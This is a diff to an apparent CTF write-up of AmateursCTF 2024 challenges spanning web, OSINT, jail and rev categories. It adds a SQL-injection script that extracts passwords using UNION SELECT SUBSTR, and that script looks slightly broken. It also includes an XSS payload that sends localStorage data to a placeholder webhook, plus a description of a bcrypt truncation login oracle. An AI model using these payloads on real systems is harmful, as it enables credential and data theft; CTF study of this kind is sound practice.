@@ -182,21 +182,43 @@ This challenge has 3 way to solve and i solve with the easiest way.
 * Third method (The intended way):
 >`{"".join([f"<li>{row[0][0] + '*' * (len(row[0]) - 1)}</li>" for row in query.fetchall()])}`
 > As you can see in the source code, it just show the first character of password. So what if union with each character of the password using substring ?
-![image](https://hackmd.io/_uploads/By3nGnIeC.png)
+
+Exploit script:
+
+```python!=
+import requests
+from bs4 import BeautifulSoup
+
+url = "http://one-shot.amt.rs"
+
+payload = "'% "
+for i in range(1, 32):
+    payload += f"UNION ALL SELECT SUBSTR(password, {1+1}) || SUBSTR(password, 1, {i}) FROM table_{id}"
+    payload += "--"
+data = {
+"id": id, # input the id of the table
+"query": payload
+}
+
+response = requests.post(url+'/search', data=data)
+soup = BeautifulSoup (response.text, 'html.parser')
+passwords = ''.join([li.text[0] for li in soup.find_all('li')])
+print(passwords)
+```
 
 Flag: `amateursCTF{go_union_select_a_life}`
 
 ### **6. osint/cherry-blossoms**
 
-![image](https://hackmd.io/_uploads/ry9C43UeC.png)
+![image](https://i.ibb.co/G3HgcTt/image-2024-04-13-113321113.png)
 
 This chall gives me a image to find the coords of this image and nc to the server and give the coords to get the flag.
 After search and using the image to look around i found that many American flags are placed in a circle is the specific characteristic to find where the place is. And i found that is Washington Monument. And the final step is go around in google maps and take the right coords. 
-![image](https://hackmd.io/_uploads/HyKdPhUxR.png)
+![image](https://i.ibb.co/Z6dKrf2/image-2024-04-13-113349848.png)
 Flag: `amateursCTF{l00k1ng_l0v3ly_1n_4k}`
 
 ### **7. jail/sansomega**
-![image](https://hackmd.io/_uploads/B15RP28gR.png)
+![image](https://i.ibb.co/TW5PpZY/image-2024-04-13-113406029.png)
 The source code: 
 ```python!=
 #!/usr/local/bin/python3
@@ -228,13 +250,13 @@ if __name__ == "__main__":
 ```
 
 They block all uppercase and lowercase letters, along with some special characters. As the first time i thought using italized characters to write expressions. But after try a lot i found that this using python:3.10 although the trick italized characters just use for  python 3.7. So i read the source carefully and see that they do not block these `/*.?` or number. So i try to use that to solve the challenge. And i found it.
-![image](https://hackmd.io/_uploads/ByEct3UxR.png)
+![image](https://i.ibb.co/fpDNnmW/image-2024-04-13-113414862.png)
 
 Flag: `amateursCTF{pic0_w45n7_g00d_n0ugh_50_i_700k_som3_cr34t1v3_l1b3rt135_ade8820e}`
 
 ### **8. rev/typo**
 
-![image](https://hackmd.io/_uploads/BybJ93IeC.png)
+![image](https://i.ibb.co/D9FnjVb/image-2024-04-13-113422046.png)
 
 The challenge give me a file `mian.py` ? It's make me confuse because the variable they name so complex so i need to change the source to see it easily lul.
 Source code (After change):
@@ -353,7 +375,7 @@ Flag: `amateursCTF{4t_l3ast_th15_fl4g_isn7_misspelll3d}`
 
 ### **9. web/sculpture**
 
-![image](https://hackmd.io/_uploads/S1wsnvDxA.png)
+![image](https://i.ibb.co/pXr1SMR/image-2024-04-13-113434978.png)
 
 Source code:
 Index.html
@@ -458,15 +480,15 @@ This code provides a web interface to run Python code using [Skulpt](https://sku
 
 So the point is skulpt runs a python code and compiles into javascript. Here is a example:
 
-![image](https://hackmd.io/_uploads/H1omydveC.png)
+![image](hhttps://i.ibb.co/8rKVVqj/image-2024-04-13-113444566.png)
 
 Total 165 lines to Javascript for just a simple `print("hello world")`. Sounds crazy lul. But the point is that it runs a python code and shows the output using pre element to display the results. And they also give the bot (typical XSS challenge). So what if we print something like `<script>alert()</script>` ?
 
-![image](https://hackmd.io/_uploads/rJmFx_wl0.png)
+![image](https://i.ibb.co/TBYbW2J/image-2024-04-13-113453318.png)
 
 But it not alert anything. It seems weird althought it show in elements. After search a bit i see [this](https://stackoverflow.com/questions/14158252/avoid-xss-with-an-html-tag-like-pre). It would be escaped because filter or sanitizer so just put `</pre>` in the begin right ? But it do not work even though i try to escape it. But wait, am i missing something ? Do i just only have tag `<script>` that raise XSS vuln ? How about `<img> , <iframe> , <svg>` tag ? 
 
-![image](https://hackmd.io/_uploads/B1eGQdvgC.png)
+![image](https://i.ibb.co/K5CP8hv/image-2024-04-13-113458993.png)
 
 And yes it works so let just build xss payload. Payload: `print("<img src=x onerror=window.location.href='<YOUR WEBHOOK>?flag='+localStorage.getItem('flag')>")`
 ```javascript!=
@@ -477,17 +499,17 @@ document.addEventListener("DOMContentLoaded",function(ev){
 ```
 The last thing you need to do is encode your payload to base64 in put it with param code to send to admin.
 
-![image](https://hackmd.io/_uploads/rJ-_rOweA.png)
+![image](https://i.ibb.co/kMQC08n/image-2024-04-13-113507124.png)
 
 Flag: `amateursCTF{i_l0v3_wh3n_y0u_can_imp0rt_xss_v3ct0r}`
 
 ### **10. osint/wumpus-leaks**
 
-![image](https://hackmd.io/_uploads/S1HRrdPl0.png)
+![image](https://i.ibb.co/48JDCDB/image-2024-04-13-113513868.png)
 
 The challenge gives me a image looks like the flag is in that image. But it hide behind the msfrog. And they also give the channel id and the message id. And the image name `IMG_7276.jpg`. 
 
-![image](https://hackmd.io/_uploads/SkSmUODe0.png)
+![image](https://i.ibb.co/bvdgYR2/image-2024-04-13-113519856.png)
 
 The point is need to find the image that locate in `cdn.discordapp`. The url looks like `https://cdn.discordapp.com/attachments/1098086661847535719/1226012804150984754/IMG_7276.jpg`. But after a try and also brute around the number image it just shows `This content is no longer available.` so i read how discord store data and i found [this one](https://www.reddit.com/r/DataHoarder/comments/16zs1gt/cdndiscordapp_links_will_expire_breaking/). 
 
@@ -501,17 +523,17 @@ The point is need to find the image that locate in `cdn.discordapp`. The url loo
 
 So it add the param to prevent other to access the file outside the discord. But what if i bring it back to discord app but another channel ? And i see this comment.
 
-![image](https://hackmd.io/_uploads/r1LutOvlA.png)
+![image](https://i.ibb.co/3B46d8Z/image-2024-04-13-113525577.png)
 
 And yes this word after i try to read back the number file. And the true image is `https://cdn.discordapp.com/attachments/1098086661847535719/1226012804150984754/IMG_7262.jpg`
 
-![image](https://hackmd.io/_uploads/H1O-5_PeA.png)
+![image](https://i.ibb.co/FVx0Cv8/image-2024-04-13-113532458.png)
 
 Flag: `amateursCTF{s1gn1ng_a1nt_g0nna_st0p_0ur_brut3}`
 
 ### **11. web/creative-login-page-challenge**
 
-![image](https://hackmd.io/_uploads/BJLmo_Pe0.png)
+![image](https://i.ibb.co/D44hjfw/image-2024-04-13-113539154.png)
 
 Source code:
 ```javascript!=
@@ -715,6 +737,6 @@ The flow exploit is:
 > - And login with 72 characters long with the password `"i" * (72 - len(s)) + s` with s is flag prefix.
 > - If the pass can login that the flag is correct. so just move on the next char (need to create a new username), i use `username = os.urandom(16).hex()` to generate a new one. And so on.
 
-![image](https://hackmd.io/_uploads/r1EPktwx0.png)
+![image](https://i.ibb.co/D9Cx0BX/image-2024-04-13-113549173.png)
 
 Flag: `amateursCTF{1_l0v3_l0gin_pAges}`
